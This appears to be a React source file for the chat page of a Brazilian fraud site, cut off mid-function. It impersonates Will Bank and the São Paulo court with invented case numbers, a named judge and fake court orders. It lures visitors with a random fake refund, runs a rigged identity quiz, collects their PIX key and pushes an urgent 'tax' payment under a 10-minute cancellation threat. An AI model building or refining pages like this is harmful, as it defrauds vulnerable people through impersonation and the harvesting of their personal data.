import { useEffect, useState, useRef, forwardRef, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Shield, Clock, Mail, Smartphone, X, Gavel, AlertTriangle } from "lucide-react";
import { CPFData } from "@/lib/cpf";
import willbankLogo from "@/assets/willbank-logo.png";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { saveSession, getSession, saveChatState, getChatState, ChatStep, ChatState } from "@/hooks/useSessionPersistence";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

interface QuizOption {
  text: string;
  isCorrect: boolean;
}
interface Message {
  id: number;
  type: 'bot' | 'user' | 'system' | 'audio' | 'error';
  content: React.ReactNode;
  time: string;
  audioSrc?: string;
}

// Save points - steps that we can restore to
const SAVE_POINTS: ChatStep[] = [
  "greeting",
  "identity-confirmed",
  "audio-3-validation",
  "pix-type-selection",
  "pix-confirm",
  "audio-2-comprovante",
  "envio-selection",
  "taxa-info",
  "final"
];

const Chat = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [step, setStep] = useState<ChatStep>("waiting-video");
  const [messages, setMessages] = useState<Message[]>([]);
  const [showVideo, setShowVideo] = useState(false);
  const [videoPlaying, setVideoPlaying] = useState(false);
  const [quizOptions, setQuizOptions] = useState<QuizOption[]>([]);
  const [pixKeyInput, setPixKeyInput] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [emailInput, setEmailInput] = useState("");
  const [showPixInput, setShowPixInput] = useState(false);
  const [showPhoneInput, setShowPhoneInput] = useState(false);
  const [showEmailInput, setShowEmailInput] = useState(false);
  const [isTyping, setIsTyping] = useState(false);
  const [currentAudio, setCurrentAudio] = useState<HTMLAudioElement | null>(null);
  const [playingAudioId, setPlayingAudioId] = useState<number | null>(null);
  const [selectedPixType, setSelectedPixType] = useState<"telefone" | "cpf" | "email" | null>(null);
  const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
  const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
  
  const [isRestoring, setIsRestoring] = useState(false);
  
  // Dialog states for popups
  const [pixDialogOpen, setPixDialogOpen] = useState(false);
  const [comprovanteDialogOpen, setComprovanteDialogOpen] = useState(false);
  const [dialogType, setDialogType] = useState<"telefone" | "email" | "sms" | null>(null);

  // Enforce audio play order in the chat UI (audio-1 first, then audio-2, then audio-3)
  const audioOrder = ["/audio/audio-1.mp3", "/audio/audio-2.mp3", "/audio/audio-3.mp3"] as const;
  const nextRequiredAudio = audioOrder.find(src => !audioListened.has(src)) ?? null;
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  
  // Try to get cpfData from location state or session
  const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
  const [valorBeneficio] = useState(() => {
    // Try to restore from session first
    const session = getSession();
    if (session?.valorBeneficio) return session.valorBeneficio;
    // Gera ticket de R$ 21,45 a R$ 51,28 com taxa 0,71%
    const minValue = 3021.13;
    const maxValue = 7222.54;
    const randomValue = Math.random() * (maxValue - minValue) + minValue;
    return Math.round(randomValue * 100) / 100;
  });
  const [protocolo] = useState(() => {
    // Try to restore from session first
    const session = getSession();
    if (session?.protocolo) return session.protocolo;
    return `202${Date.now().toString().slice(-13)}`;
  });
  const [processoNumero] = useState("0034567-89.2024.8.26.0100");

  // Save chat state to session at key points
  const persistChatState = useCallback((currentStep: ChatStep) => {
    // Only save at save points
    if (!SAVE_POINTS.includes(currentStep)) return;
    
    const chatState: ChatState = {
      chatStep: currentStep,
      chatAudioListened: Array.from(audioListened),
      chatPixType: selectedPixType,
      chatPixKey: pixKeyInput,
      chatVideoWatched: !showVideo,
    };
    saveChatState(chatState);
    console.log('[Chat] State saved at:', currentStep);
  }, [audioListened, selectedPixType, pixKeyInput, showVideo]);

  // Save state when step changes to a save point
  useEffect(() => {
    if (SAVE_POINTS.includes(step)) {
      persistChatState(step);
    }
  }, [step, persistChatState]);

  const getCurrentTime = () => {
    return new Date().toLocaleTimeString('pt-BR', {
      hour: '2-digit',
      minute: '2-digit'
    });
  };
  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({
      behavior: "smooth"
    });
  };
  useEffect(() => {
    scrollToBottom();
  }, [messages, step, isTyping]);
  
  // Initialize chat - check for saved state or start fresh
  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }
    
    // Save session with valorBeneficio and protocolo
    saveSession({ cpfData, currentStep: "/chat", valorBeneficio, protocolo });
    
    // Track funnel event
    trackFunnelEvent('chat', { cpf: cpfData.cpf });
    
    // Check if we have saved chat state to restore
    const savedChatState = getChatState();
    
    if (savedChatState && savedChatState.chatVideoWatched && SAVE_POINTS.includes(savedChatState.chatStep)) {
      console.log('[Chat] Restoring state from:', savedChatState.chatStep);
      setIsRestoring(true);
      
      // Restore state
      setAudioListened(new Set(savedChatState.chatAudioListened));
      setSelectedPixType(savedChatState.chatPixType);
      setPixKeyInput(savedChatState.chatPixKey);
      setShowVideo(false);
      
      // Rebuild chat to saved step
      rebuildChatToStep(savedChatState.chatStep);
    } else {
      // Start fresh - show video
      setShowVideo(true);
      setStep("waiting-video");
    }
  }, [cpfData, navigate, valorBeneficio, protocolo]);
  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  // Rebuild chat messages to a specific step (for restoration)
  const rebuildChatToStep = async (targetStep: ChatStep) => {
    const fastDelay = 50; // Fast rebuild
    
    // Add greeting messages
    setMessages([]);
    
    const addQuickBotMessage = (content: React.ReactNode) => {
      const newMessage: Message = {
        id: Date.now() + Math.random(),
        type: 'bot',
        content,
        time: getCurrentTime()
      };
      setMessages(prev => [...prev, newMessage]);
    };

    const addQuickAudioMessage = (audioSrc: string) => {
      const newMessage: Message = {
        id: Date.now() + Math.random(),
        type: 'audio',
        content: null,
        time: getCurrentTime(),
        audioSrc
      };
      setMessages(prev => [...prev, newMessage]);
    };
    
    // Build messages based on how far we got
    await delay(fastDelay);
    
    // Always add initial messages after video
    addQuickBotMessage(
      <div className="space-y-2">
        <div className="flex items-center gap-2 text-amber-500 font-bold">
          <AlertTriangle className="w-5 h-5" />
          <span>ATENÇÃO {cpfData?.nome?.split(' ')[0]}!</span>
        </div>
        <p>Você está acessando o <strong className="text-primary">SETOR DE LIQUIDAÇÃO JUDICIAL</strong> do Will Bank.</p>
      </div>
    );
    
    addQuickBotMessage(
      <div className="space-y-2">
        <p>Seu atendimento foi registrado no <strong>Tribunal de Justiça de São Paulo</strong> sob o:</p>
        <div className="bg-slate-800 border border-primary/30 rounded-lg p-2 text-center">
          <span className="text-xs text-muted-foreground">PROTOCOLO</span>
          <p className="font-mono font-bold text-primary text-lg">{protocolo}</p>
        </div>
      </div>
    );
    
    addQuickBotMessage(
      <div className="space-y-3">
        <div className="flex items-center gap-2 text-primary font-bold">
          <Gavel className="w-5 h-5" />
          <span>DECISÃO JUDICIAL</span>
        </div>
        <p className="text-sm">Identificamos que seu CPF possui <strong className="text-destructive">VALORES RETIDOS ILEGALMENTE</strong> pelo Will Bank antes do encerramento das atividades.</p>
        <p className="text-sm">A Justiça determinou a <strong className="text-green-500">DEVOLUÇÃO IMEDIATA</strong> de:</p>
        <div className="bg-green-50 border-2 border-green-300 rounded-xl p-4 text-center">
          <div className="inline-flex items-center gap-2 bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full mb-2">
            <Gavel className="w-3 h-3" />
            PAGAMENTO AUTORIZADO PELA JUSTIÇA
          </div>
          <p className="text-green-700 font-black text-2xl">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
        </div>
      </div>
    );

    if (targetStep === "greeting") {
      setStep("greeting");
      setIsRestoring(false);
      return;
    }

    // Identity confirmed - quiz passed
    addQuickBotMessage(
      <div className="bg-green-50 border-2 border-green-300 rounded-xl p-4">
        <div className="flex items-center gap-2 text-green-700 font-bold mb-2">
          <Shield className="w-5 h-5" />
          IDENTIDADE VERIFICADA - PAGAMENTO AUTORIZADO
        </div>
        <p className="text-sm text-green-600">Sua identidade foi confirmada junto ao <strong>Sistema Nacional de Verificação Judicial</strong>.</p>
      </div>
    );

    // Add certificate
    addQuickBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        <h3 className="text-lg font-bold text-center bg-primary text-primary-foreground py-2 rounded-lg flex items-center justify-center gap-2">
          <Gavel className="w-5 h-5" />
          ORDEM DE PAGAMENTO JUDICIAL
        </h3>
        <div className="bg-gradient-to-r from-green-500 to-emerald-500 text-white text-center py-2 rounded-full text-sm font-bold flex items-center justify-center gap-2">
          <CheckCircle2 className="w-4 h-4" />
          PAGAMENTO DETERMINADO PELA JUSTIÇA
        </div>
      </div>
    );

    // Audio 1
    addQuickAudioMessage("/audio/audio-1.mp3");

    if (targetStep === "identity-confirmed" || targetStep === "audio-3-validation") {
      setWaitingForAudio(audioListened.has("/audio/audio-1.mp3") ? null : "/audio/audio-1.mp3");
      setStep("audio-3-validation");
      setIsRestoring(false);
      return;
    }

    // PIX type selection - after approval animation
    addQuickBotMessage(
      <div className="space-y-3">
        <div className="flex items-center gap-2 text-green-600 text-lg font-bold">
          <CheckCircle2 className="w-6 h-6" />
          PAGAMENTO JUDICIAL LIBERADO! ✅
        </div>
        <p className="text-sm">O Tribunal autorizou a transferência para sua conta.</p>
      </div>
    );

    addQuickBotMessage(
      <span>Selecione a <strong>chave PIX cadastrada no seu nome</strong> para receber o <strong>PRIMEIRO SAQUE</strong> da sua indenização:</span>
    );

    if (targetStep === "pix-type-selection") {
      setStep("pix-type-selection");
      setIsRestoring(false);
      return;
    }

    // PIX confirmed
    if (selectedPixType) {
      const pixKey = selectedPixType === "cpf" ? cpfData?.cpf : pixKeyInput;
      addQuickBotMessage(
        <div className="bg-amber-50 border-2 border-amber-400 rounded-xl p-4 space-y-3">
          <div className="flex items-center gap-2 text-amber-700 font-bold">
            <Gavel className="w-5 h-5" />
            ÚLTIMA VERIFICAÇÃO DO TRIBUNAL
          </div>
          <div className="bg-white rounded-lg p-3 border-2 border-amber-300 space-y-1 text-foreground">
            <p className="text-foreground"><strong>Nome:</strong> {cpfData?.nome}</p>
            <p className="text-foreground"><strong>Chave Pix:</strong> {pixKey}</p>
          </div>
        </div>
      );
    }

    if (targetStep === "pix-confirm") {
      setStep("pix-confirm");
      setIsRestoring(false);
      return;
    }

    // Audio 2 - comprovante
    addQuickBotMessage(
      <span className="flex items-center gap-2 text-green-600">
        <CheckCircle2 className="w-4 h-4" />
        Chave PIX registrada com sucesso no processo!
      </span>
    );
    addQuickAudioMessage("/audio/audio-2.mp3");

    if (targetStep === "audio-2-comprovante") {
      setWaitingForAudio(audioListened.has("/audio/audio-2.mp3") ? null : "/audio/audio-2.mp3");
      setStep("audio-2-comprovante");
      setIsRestoring(false);
      return;
    }

    // Envio selection - after comprovante generated
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    addQuickBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg text-foreground">
        <h3 className="text-lg font-bold text-center bg-primary text-primary-foreground py-2 rounded-lg flex items-center justify-center gap-2">
          <Gavel className="w-5 h-5" />
          ORDEM DE PAGAMENTO - LIQUIDAÇÃO JUDICIAL
        </h3>
        <div className="bg-gradient-to-r from-green-500 to-emerald-500 text-white text-center py-2 rounded-full text-sm font-bold">
          📄 DOCUMENTO OFICIAL DO TRIBUNAL
        </div>
      </div>
    );

    addQuickBotMessage(
      <div className="bg-amber-50 border border-amber-300 rounded-lg p-3">
        <p className="text-amber-800 text-sm">
          <strong>⚖️ EXIGÊNCIA DO TRIBUNAL:</strong> Você <strong>DEVE</strong> receber uma cópia da sua Ordem de Pagamento. Escolha o método de envio:
        </p>
      </div>
    );

    if (targetStep === "envio-selection") {
      setStep("envio-selection");
      setIsRestoring(false);
      return;
    }

    // Taxa info
    addQuickBotMessage(
      <div className="bg-red-600 border-2 border-red-700 rounded-xl p-4 space-y-3 text-white">
        <div className="flex items-center gap-2 font-bold text-lg">
          <AlertTriangle className="w-6 h-6" />
          AVISO URGENTE DO TRIBUNAL DE JUSTIÇA
        </div>
        <p className="text-sm">Seu pagamento de <strong>R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> está <strong>BLOQUEADO</strong> pelo Banco Central.</p>
      </div>
    );

    if (targetStep === "taxa-info") {
      setStep("taxa-info");
      setIsRestoring(false);
      return;
    }

    // Final - after tax explanation
    addQuickBotMessage(
      <div className="bg-card rounded-xl p-4 space-y-3 border-2 border-primary/30 text-foreground">
        <div className="flex items-center gap-2 text-primary font-bold">
          <Gavel className="w-5 h-5" />
          ENTENDENDO A EXIGÊNCIA LEGAL
        </div>
        <div className="bg-muted rounded-lg p-3 space-y-2 text-sm">
          <p className="font-bold text-foreground">📊 DETALHAMENTO DO IMPOSTO:</p>
          <div className="pt-2 border-t border-border">
            <p className="font-bold text-primary text-base">Total do Imposto: R$ {totalImposto.toFixed(2).replace('.', ',')} (0,71% do valor a receber)</p>
          </div>
        </div>
      </div>
    );
    
    addQuickAudioMessage("/audio/audio-3.mp3");
    
    addQuickBotMessage(
      <div className="space-y-3">
        <div className="bg-red-50 border-2 border-red-300 rounded-lg p-3 text-sm text-red-700">
          <strong>⚠️ AVISO FINAL:</strong> Se você <strong>NÃO</strong> realizar o pagamento nos próximos <strong>10 minutos</strong>, sua Ordem de Pagamento será <strong>AUTOMATICAMENTE CANCELADA</strong>.
        </div>
      </div>
    );

    if (targetStep === "final") {
      setWaitingForAudio(audioListened.has("/audio/audio-3.mp3") ? null : "/audio/audio-3.mp3");
      setStep("final");
      setIsRestoring(false);
      return;
    }

    // Default fallback
    setStep(targetStep);
    setIsRestoring(false);
  };

  // Realistic typing delays
  const getTypingDelay = (messageLength: number) => {
    const baseDelay = 1500;
    const perCharDelay = 25;
    return Math.min(baseDelay + messageLength * perCharDelay, 4000);
  };
  const addBotMessage = async (content: React.ReactNode, showTyping = true, messageLength = 50) => {
    if (showTyping) {
      setIsTyping(true);
      await delay(getTypingDelay(messageLength));
      setIsTyping(false);
    }
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'bot',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(800);
  };
  const addAudioMessage = async (audioSrc: string, showTyping = true) => {
    if (showTyping) {
      setIsTyping(true);
      await delay(2000);
      setIsTyping(false);
    }
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'audio',
      content: null,
      time: getCurrentTime(),
      audioSrc
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(500);
  };
  const addUserMessage = (content: React.ReactNode) => {
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'user',
      content,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
  };
  const addErrorMessage = async () => {
    const newMessage: Message = {
      id: Date.now() + Math.random(),
      type: 'error',
      content: <div className="flex flex-col items-center text-center space-y-4 p-4">
          <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center">
            <X className="w-12 h-12 text-white" strokeWidth={3} />
          </div>
          <p className="text-lg">
            A opção selecionada <strong>não é compatível</strong> com o nome registrado na <strong>Receita Federal</strong>.
          </p>
        </div>,
      time: getCurrentTime()
    };
    setMessages(prev => [...prev, newMessage]);
    await delay(1500);
  };
  const generateFakeOptions = (correctAnswer: string, type: "mae" | "nascimento"): QuizOption[] => {
    const fakeNames = ["MARIA SANTOS OLIVEIRA", "ANA PAULA FERREIRA", "CLAUDIA SOUZA LIMA", "PATRICIA GOMES SILVA"];
    const fakeDates = ["15/03/1998", "22/07/1995", "08/12/2001", "30/05/1999"];
    
    if (type === "mae") {
      const naoIdentificada = "NÃO IDENTIFICADA";
      const shuffled = fakeNames.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5).slice(0, 2);
      
      // Add "NÃO IDENTIFICADA" - always passes
      shuffled.push(naoIdentificada);
      
      // Add correct answer if available and different from fake options
      if (correctAnswer && correctAnswer !== "Não disponível" && correctAnswer.trim() !== "") {
        shuffled.push(correctAnswer);
      }
      
      return shuffled.sort(() => Math.random() - 0.5).map(text => ({
        text,
        // Both the correct answer AND "NÃO IDENTIFICADA" are always correct
        isCorrect: text === correctAnswer || text === naoIdentificada
      }));
    } else {
      const shuffled = fakeDates.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5).slice(0, 3);
      shuffled.push(correctAnswer);
      return shuffled.sort(() => Math.random() - 0.5).map(text => ({
        text,
        isCorrect: text === correctAnswer
      }));
    }
  };

  const handleVideoEnd = async () => {
    setVideoPlaying(false);
    setShowVideo(false);
    await delay(1500);

    // Mensagem 1 - Abertura com urgência
    await addBotMessage(
      <div className="space-y-2">
        <div className="flex items-center gap-2 text-amber-500 font-bold">
          <AlertTriangle className="w-5 h-5" />
          <span>ATENÇÃO {cpfData?.nome?.split(' ')[0]}!</span>
        </div>
        <p>Você está acessando o <strong className="text-primary">SETOR DE LIQUIDAÇÃO JUDICIAL</strong> do Will Bank.</p>
      </div>, 
      true, 80
    );
    await delay(1200);

    // Mensagem 2 - Protocolo com referência ao Tribunal
    await addBotMessage(
      <div className="space-y-2">
        <p>Seu atendimento foi registrado no <strong>Tribunal de Justiça de São Paulo</strong> sob o:</p>
        <div className="bg-slate-800 border border-primary/30 rounded-lg p-2 text-center">
          <span className="text-xs text-muted-foreground">PROTOCOLO</span>
          <p className="font-mono font-bold text-primary text-lg">{protocolo}</p>
        </div>
      </div>, 
      true, 60
    );
    await delay(1500);

    // Mensagem 3 - Decisão Judicial com valor
    await addBotMessage(
      <div className="space-y-3">
        <div className="flex items-center gap-2 text-primary font-bold">
          <Gavel className="w-5 h-5" />
          <span>DECISÃO JUDICIAL</span>
        </div>
        <p className="text-sm">Identificamos que seu CPF possui <strong className="text-destructive">VALORES RETIDOS ILEGALMENTE</strong> pelo Will Bank antes do encerramento das atividades.</p>
        <p className="text-sm">A Justiça determinou a <strong className="text-green-500">DEVOLUÇÃO IMEDIATA</strong> de:</p>
        <div className="bg-green-50 border-2 border-green-300 rounded-xl p-4 text-center">
          <div className="inline-flex items-center gap-2 bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full mb-2">
            <Gavel className="w-3 h-3" />
            PAGAMENTO AUTORIZADO PELA JUSTIÇA
          </div>
          <p className="text-green-700 font-black text-2xl">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
        </div>
      </div>, 
      true, 120
    );
    await delay(2000);

    // Mensagem 4 - Explicação sobre parcelas
    await addBotMessage(
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-sm">
        <p className="text-blue-800">
          <strong>ℹ️ IMPORTANTE:</strong> Este é o valor do seu <strong>PRIMEIRO SAQUE</strong>. Conforme determinação judicial, valores superiores a R$ 5.000 são liberados em parcelas.
        </p>
      </div>, 
      true, 80
    );
    await delay(1500);

    // Mensagem 5 - Verificação de identidade
    await addBotMessage(
      <span>Para liberar seu pagamento, responda as perguntas de <strong>VERIFICAÇÃO DE IDENTIDADE</strong> exigidas pelo Tribunal.</span>, 
      true, 70
    );
    await delay(1200);

    await addBotMessage(<span><strong>Qual o nome da sua mãe?</strong></span>, true, 25);
    await delay(500);
    await addBotMessage(<span className="text-muted-foreground text-sm">Escolha a alternativa correta.</span>, false);
    setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
    setStep("quiz-mae");
  };

  const handleVideoClick = () => {
    if (videoRef.current) {
      if (videoPlaying) {
        videoRef.current.pause();
        setVideoPlaying(false);
      } else {
        videoRef.current.play();
        setVideoPlaying(true);
      }
    }
  };

  const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
    const currentQuizType = quizType;
    addUserMessage(<span>{option.text}</span>);
    setQuizOptions([]);
    await delay(500);
    if (option.isCorrect) {
      await addBotMessage(
        <span className="flex items-center gap-2 text-green-600">
          <CheckCircle2 className="w-4 h-4" />
          <strong>VERIFICAÇÃO CONFIRMADA PELO TRIBUNAL</strong> ✅
        </span>, 
        true, 30
      );
      if (currentQuizType === "mae") {
        await delay(1000);
        await addBotMessage(<span>Próxima pergunta...</span>, true, 20);
        await delay(1000);
        await addBotMessage(<span><strong>Qual sua data de nascimento?</strong></span>, true, 30);
        await delay(500);
        await addBotMessage(<span className="text-muted-foreground text-sm">Escolha a alternativa correta.</span>, false);
        const newOptions = generateFakeOptions(cpfData?.dataNascimento || "", "nascimento");
        setStep("quiz-nascimento");
        await delay(100);
        setQuizOptions(newOptions);
      } else {
        await delay(1000);
        await addBotMessage(
          <div className="bg-green-50 border-2 border-green-300 rounded-xl p-4">
            <div className="flex items-center gap-2 text-green-700 font-bold mb-2">
              <Shield className="w-5 h-5" />
              IDENTIDADE VERIFICADA - PAGAMENTO AUTORIZADO
            </div>
            <p className="text-sm text-green-600">Sua identidade foi confirmada junto ao <strong>Sistema Nacional de Verificação Judicial</strong>.</p>
          </div>, 
          true, 50
        );
        setStep("identity-confirmed");
        await showAutenticidadeCertificado();
      }
    } else {
      await addErrorMessage();
      await addBotMessage(<span>Tente novamente:</span>, true, 20);
      await delay(300);
      const retryOptions = generateFakeOptions(currentQuizType === "mae" ? cpfData?.nomeMae || "" : cpfData?.dataNascimento || "", currentQuizType);
      setQuizOptions(retryOptions);
    }
  };

  const playAudio = (audioSrc: string, messageId: number) => {
    if (currentAudio) {
      currentAudio.pause();
      currentAudio.currentTime = 0;
    }
    if (playingAudioId === messageId) {
      setPlayingAudioId(null);
      setCurrentAudio(null);
      return;
    }
    const audio = new Audio(audioSrc);
    audio.play();
    setCurrentAudio(audio);
    setPlayingAudioId(messageId);
    audio.onended = () => {
      setPlayingAudioId(null);
      setCurrentAudio(null);
      setAudioListened(prev => new Set(prev).add(audioSrc));
      if (waitingForAudio === audioSrc) {
        setWaitingForAudio(null);
      }
    };
  };

  const showAutenticidadeCertificado = async () => {
    await delay(2000);

    // ORDEM DE PAGAMENTO JUDICIAL
    await addBotMessage(
      <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        
        <h3 className="text-lg font-bold text-center bg-primary text-primary-foreground py-2 rounded-lg flex items-center justify-center gap-2">
          <Gavel className="w-5 h-5" />
          ORDEM DE PAGAMENTO JUDICIAL
        </h3>
        
        <div className="bg-gradient-to-r from-green-500 to-emerald-500 text-white text-center py-2 rounded-full text-sm font-bold flex items-center justify-center gap-2">
          <CheckCircle2 className="w-4 h-4" />
          PAGAMENTO DETERMINADO PELA JUSTIÇA
        </div>

        <div className="bg-blue-50 border-l-4 border-blue-500 p-3 text-sm text-blue-800">
          <p>Em cumprimento à <strong>DECISÃO JUDICIAL</strong> movida contra o Will Bank, fica <strong>DETERMINADO</strong> o pagamento da quantia abaixo ao titular do CPF, referente a valores <strong className="text-red-600">RETIDOS ILEGALMENTE</strong> antes do encerramento das atividades do banco.</p>
        </div>

        <div className="divide-y border rounded-xl overflow-hidden bg-muted/30">
          <DataRow label="Nome Completo" value={cpfData?.nome || ""} />
          <DataRow label="CPF" value={cpfData?.cpf || ""} />
          <DataRow label="N° do Processo" value={processoNumero} />
          <DataRow label="Juízo" value="15ª Vara Cível - TJ/SP" />
          <DataRow label="Juiz Responsável" value="Dr. Carlos Eduardo Monteiro" />
          <DataRow label="Tipo" value="Restituição por Liquidação Bancária" />
          <DataRow label="Protocolo" value={protocolo} />
          <DataRow label="Data/Hora" value={new Date().toLocaleString('pt-BR')} />
        </div>
      </div>, 
      false
    );
    await delay(2500);

    // Áudio 1 - Validação
    await addAudioMessage("/audio/audio-1.mp3");
    await delay(1000);
    await addBotMessage(
      <div className="bg-amber-50 border border-amber-300 rounded-lg p-3 text-sm">
        <p className="text-amber-800">
          <strong>⚠️ IMPORTANTE:</strong> Para que o Banco Central autorize a transferência, ouça o áudio do nosso advogado explicando o processo e clique em <strong>CONFIRMAR ORDEM DE PAGAMENTO</strong>.
        </p>
      </div>, 
      true, 80
    );
    setWaitingForAudio("/audio/audio-1.mp3");
    setStep("audio-3-validation");
  };

  const handleConfirmValidation = async () => {
    addUserMessage(<span>✓ CONFIRMAR ORDEM DE PAGAMENTO</span>);
    setStep("processing");
    await delay(1500);

    // Approval Animation Card
    await addBotMessage(<ApprovalAnimation value={valorBeneficio} name={cpfData?.nome || ""} />, false);
    await delay(3500);

    // Mensagem pós-aprovação
    await addBotMessage(
      <div className="space-y-3">
        <div className="flex items-center gap-2 text-green-600 text-lg font-bold">
          <CheckCircle2 className="w-6 h-6" />
          PAGAMENTO JUDICIAL LIBERADO! ✅
        </div>
        <p className="text-sm">O Tribunal autorizou a transferência para sua conta.</p>
        <div className="bg-red-50 border border-red-200 rounded-lg p-2 text-xs text-red-700">
          <strong>⚠️ NÃO FECHE ESTA PÁGINA</strong> ou você perderá sua posição na fila de pagamentos.
        </div>
      </div>, 
      true, 60
    );
    await delay(1500);

    await addBotMessage(
      <span>Selecione a <strong>chave PIX cadastrada no seu nome</strong> para receber o <strong>PRIMEIRO SAQUE</strong> da sua indenização:</span>, 
      true, 70
    );
    setStep("pix-type-selection");
  };

  const handlePixTypeTelefone = async () => {
    addUserMessage(<span>📱 Telefone</span>);
    setSelectedPixType("telefone");
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (telefone):</span>, true, 40);
    setStep("pix-cpf-input");
    setDialogType("telefone");
    setPixDialogOpen(true);
  };

  const handlePixTypeCPF = async () => {
    addUserMessage(<span>📋 CPF</span>);
    setSelectedPixType("cpf");
    setPixKeyInput(cpfData?.cpf || "");
    setStep("processing");
    await delay(1500);
    await addBotMessage(
      <div className="bg-amber-50 border-2 border-amber-400 rounded-xl p-4 space-y-3">
        <div className="flex items-center gap-2 text-amber-700 font-bold">
          <Gavel className="w-5 h-5" />
          ÚLTIMA VERIFICAÇÃO DO TRIBUNAL
        </div>
        <p className="text-sm text-amber-800">O Banco Central exige que você <strong>CONFIRME</strong> os dados abaixo antes de autorizar a transferência:</p>
        <div className="bg-white rounded-lg p-3 border-2 border-amber-300 space-y-1 text-foreground">
          <p className="text-foreground"><strong>Nome:</strong> {cpfData?.nome}</p>
          <p className="text-foreground"><strong>Chave Pix:</strong> {cpfData?.cpf}</p>
        </div>
        <div className="bg-red-100 border border-red-300 rounded-lg p-2 text-xs text-red-700">
          <strong>⚠️ AVISO JUDICIAL:</strong> Após a confirmação, NÃO será possível alterar a chave PIX. Valores transferidos para chave incorreta NÃO serão reembolsados pelo Tribunal.
        </div>
      </div>, 
      true, 100
    );
    setStep("pix-confirm");
  };

  const handlePixTypeEmail = async () => {
    addUserMessage(<span>📧 E-mail</span>);
    setSelectedPixType("email");
    setStep("processing");
    await delay(1500);
    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (e-mail):</span>, true, 40);
    setStep("pix-email-input");
    setDialogType("email");
    setPixDialogOpen(true);
  };

  const handlePixKeySubmit = async () => {
    if (!pixKeyInput.trim()) return;
    setPixDialogOpen(false);
    addUserMessage(<span>{pixKeyInput}</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(
      <div className="bg-amber-50 border-2 border-amber-400 rounded-xl p-4 space-y-3">
        <div className="flex items-center gap-2 text-amber-700 font-bold">
          <Gavel className="w-5 h-5" />
          ÚLTIMA VERIFICAÇÃO DO TRIBUNAL
        </div>
        <p className="text-sm text-amber-800">O Banco Central exige que você <strong>CONFIRME</strong> os dados abaixo antes de autorizar a transferência:</p>
        <div className="bg-white rounded-lg p-3 border-2 border-amber-300 space-y-1 text-foreground">
          <p className="text-foreground"><strong>Nome:</strong> {cpfData?.nome}</p>
          <p className="text-foreground"><strong>Chave Pix:</strong> {pixKeyInput}</p>
        </div>
        <div className="bg-red-100 border border-red-300 rounded-lg p-2 text-xs text-red-700">
          <strong>⚠️ AVISO JUDICIAL:</strong> Após a confirmação, NÃO será possível alterar a chave PIX. Valores transferidos para chave incorreta NÃO serão reembolsados pelo Tribunal.
        </div>
      </div>, 
      true, 100
    );
    setStep("pix-confirm");
  };

  const handleConfirmPix = async () => {
    addUserMessage(<span>Sim, está correto ✓</span>);
    setStep("processing");
    await delay(1000);
    await addBotMessage(<span>Aguarde um momento!</span>, true, 20);
    await delay(1500);
    await addBotMessage(<span className="text-primary">Registrando sua chave PIX no sistema judicial...</span>, true, 50);
    await delay(2000);
    await addBotMessage(
      <span className="flex items-center gap-2 text-green-600">
        <CheckCircle2 className="w-4 h-4" />
        Chave PIX registrada com sucesso no processo!
      </span>, 
      true, 40
    );
    await delay(2000);

    // Audio 2 - Comprovante
    await addAudioMessage("/audio/audio-2.mp3");
    await delay(1000);
    await addBotMessage(
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 text-sm">
        <p className="text-blue-800">Para <strong>FINALIZAR</strong> o processo, ouça as instruções do advogado e clique em <strong>GERAR ORDEM DE PAGAMENTO</strong>.</p>
      </div>, 
      true, 70
    );
    setWaitingForAudio("/audio/audio-2.mp3");
    setStep("audio-2-comprovante");
  };

  const handleGenerateComprovante = async () => {
    addUserMessage(<span>GERAR ORDEM DE PAGAMENTO</span>);
    setStep("processing");
    await delay(1500);
    await addBotMessage(
